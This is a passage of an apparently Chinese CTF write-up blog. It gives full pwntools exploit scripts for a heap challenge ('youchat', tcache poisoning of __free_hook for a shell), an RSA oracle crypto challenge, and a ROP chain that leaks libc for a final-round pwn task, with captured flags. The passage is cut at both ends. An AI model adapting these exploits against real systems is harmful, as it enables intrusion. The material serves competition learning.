class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>

<p>flag{ovgwkjRhB0EDgSHvp7ihCGPiRqHGAfUI}</p>
<h2 id="pwn3-youchat"><a href="#pwn3-youchat" class="headerlink" title="pwn3 [youchat]"></a>pwn3 [youchat]</h2><p>当时网络有点差，比赛结束几分钟刚好打通远程，都怪没有看到update功能。。。</p>
<p>这个漏洞在添加用户后，logout用户时，会释放当前内存地址-0x10，若控制好 addr-0x10处的大小，即可控制堆重叠，修改tcache fd为free_hook。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li  = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.27&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;124.70.158.59&quot;</span><br>server_port = <span class="hljs-number">30023</span><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, i, d, d2</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, d2)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">i, n</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>():<br>	sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	add(<span class="hljs-number">0</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x4B1</span>), <span class="hljs-string">b&#x27;C&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">1</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">2</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;D&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">3</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">4</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">5</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;G&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">6</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;H&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;H&#x27;</span> * <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br>	logout(<span class="hljs-number">1</span>)<br>	add(<span class="hljs-number">8</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	view(<span class="hljs-number">8</span>)<br>	<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>) <br>	main_arena = <span class="hljs-number">0x3afc40</span> <span class="hljs-comment"># local</span><br>	main_arena = <span class="hljs-number">0x3ebc40</span> <span class="hljs-comment"># local</span><br>	libc_base = leak - main_arena - <span class="hljs-number">0x3a2</span> - <span class="hljs-number">96</span><br>	free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	sh_str = libc_base +  <span class="hljs-number">0x1b40fa</span><br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	<br>	add(<span class="hljs-number">9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;O&#x27;</span> * <span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x91</span>), <span class="hljs-string">&#x27;&#x27;</span>)<br>	logout(<span class="hljs-number">2</span>)<br>	add(<span class="hljs-number">10</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;G&#x27;</span> * <span class="hljs-number">0x10</span> + p64(free_hook) + p64(free_hook), p64(free_hook))<br><br>	add(<span class="hljs-number">11</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;G&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br>	add(<span class="hljs-number">12</span>, <span class="hljs-number">0x81</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]), <span class="hljs-string">b&#x27;G&#x27;</span> * <span class="hljs-number">0x8</span> + p64(<span class="hljs-number">0x91</span>))<br><br>	add(<span class="hljs-number">1</span>, <span class="hljs-number">0x81</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;G&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	update(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>	<span class="hljs-comment">#db()</span><br>	logout(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>

<p>flag{KNT5Z3gX6H9Honi5CH18kYHutIp7E8LD}</p>
<h2 id="Crypto3-crypto-lp"><a href="#Crypto3-crypto-lp" class="headerlink" title="Crypto3 [crypto_lp]"></a>Crypto3 [crypto_lp]</h2><p>rsa侧信道攻击</p>
<p>该exp与是happi0师傅合作编写的，两个合作搞了半天，打通后，只打印flag前面部分，后面的数全为空，原因是没有整除查找，输出的是浮点类型的数。。。后面happi0师傅找到了原因并且打通了^_^，自己不懂，先贴着。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">scret, c</span>):<br>    sl(<span class="hljs-string">&#x27;o&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(scret))<br>    sl(<span class="hljs-built_in">str</span>(c))<br>    ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>    cd = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">10</span>)<br>    <span class="hljs-comment">#li(&#x27;cd: &#x27; + str(c))</span><br>    <span class="hljs-keyword">return</span> cd<br>    <br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    n = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">10</span>)<br>    nn = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">10</span>)<br>    C = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">10</span>)<br><br>    li(<span class="hljs-string">&#x27;n: &#x27;</span> + <span class="hljs-built_in">str</span>(n))<br>    li(<span class="hljs-string">&#x27;nn: &#x27;</span> + <span class="hljs-built_in">str</span>(nn))<br>    li(<span class="hljs-string">&#x27;c &#x27;</span> + <span class="hljs-built_in">str</span>(c))<br><br>    sl(<span class="hljs-string">&#x27;l&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>    tmp1 = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">10</span>)<br>    li(<span class="hljs-string">&#x27;tmp1 &#x27;</span> + <span class="hljs-built_in">str</span>(tmp1))<br>    <br>    sl(<span class="hljs-string">&#x27;p&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(tmp1 + n))<br>    ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>    scret = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">10</span>)<br>    <br>    l = <span class="hljs-number">0</span><br>    r = nn<br>    i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(l != r):<br>        C = C * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">65537</span>, nn) % nn<br>        ret = get(scret, C)<br>        li(<span class="hljs-string">&#x27;times:&#x27;</span> + <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&#x27; ret: &#x27;</span> + <span class="hljs-built_in">str</span>(ret))<br>        <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">0</span>):<br>            r = (l + r) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            l = (l + r) // <span class="hljs-number">2</span><br>        i += <span class="hljs-number">1</span><br>    l = <span class="hljs-built_in">int</span>(l)<br>    l1 = l - <span class="hljs-number">1</span><br>    l2 = l + <span class="hljs-number">1</span><br>    li(<span class="hljs-string">&#x27;GET FLAG:\n&#x27;</span> + <span class="hljs-built_in">str</span>(l))<br>    li(<span class="hljs-string">&#x27;flag: &#x27;</span> + <span class="hljs-built_in">str</span>(l))<br>    li(<span class="hljs-string">b&#x27;flag: &#x27;</span> + long_to_bytes(l))<br>    li(<span class="hljs-string">b&#x27;flag: &#x27;</span> + long_to_bytes(l1))<br>    li(<span class="hljs-string">b&#x27;flag: &#x27;</span> + long_to_bytes(l2))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    io = remote(<span class="hljs-string">&#x27;119.3.152.203&#x27;</span>, <span class="hljs-number">7001</span>)<br><br>    exploit()<br>    finish()<br></code></pre></td></tr></table></figure>



<h1 id="Final-competition"><a href="#Final-competition" class="headerlink" title="Final competition"></a>Final competition</h1><h2 id="Individual-Jeopardy"><a href="#Individual-Jeopardy" class="headerlink" title="Individual Jeopardy"></a>Individual Jeopardy</h2><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;10.10.21.11&quot;</span><br><br>server_port = <span class="hljs-number">10002</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">d</span>):<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	ad(<span class="hljs-string">&#x27;song&#x27;</span>)<br>	ad(<span class="hljs-string">&#x27;jump&#x27;</span>)<br>	ad(<span class="hljs-string">&#x27;rap&#x27;</span>)<br>	ad(<span class="hljs-string">&#x27;NBA&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	pop_rdi = <span class="hljs-number">0x400c73</span><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(pop_rdi)<br>	p += p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	p += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	p += p64(<span class="hljs-number">0x4008B6</span>)<br>	sl(p)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	libc_base = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	p = <span 